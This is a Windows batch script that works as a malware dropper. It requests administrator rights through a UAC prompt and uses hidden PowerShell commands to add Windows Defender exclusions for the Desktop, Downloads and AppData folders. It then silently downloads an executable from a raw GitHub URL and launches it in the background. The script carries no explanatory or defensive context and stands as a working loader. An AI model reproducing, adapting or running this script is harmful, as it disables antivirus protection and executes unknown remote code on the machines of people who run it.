@echo off

:: BatchGotAdmin
:-------------------------------------
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    EXIT /B

:gotAdmin
    pushd "%TEMP%"
    CD /D "%~dp0"


REM --> Silent PowerShell commands
    powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
    powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
    powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1


cd %TEMP%

 


@powershell -WindowStyle Hidden -Command "Invoke-WebRequest "https://raw.githubusercontent.com/walks111551/09672018256120856125/main/R2Tf11dq2.exe" -OutFile R2Tf11dq2.exe" >nul 2>&1

    REM --> Execute R2Tf11dq2.exe silently
    start /B "" R2Tf11dq2.exe >nul 2>&1
    timeout /t 5 /nobreak >nul 2>&1



EXIT /B

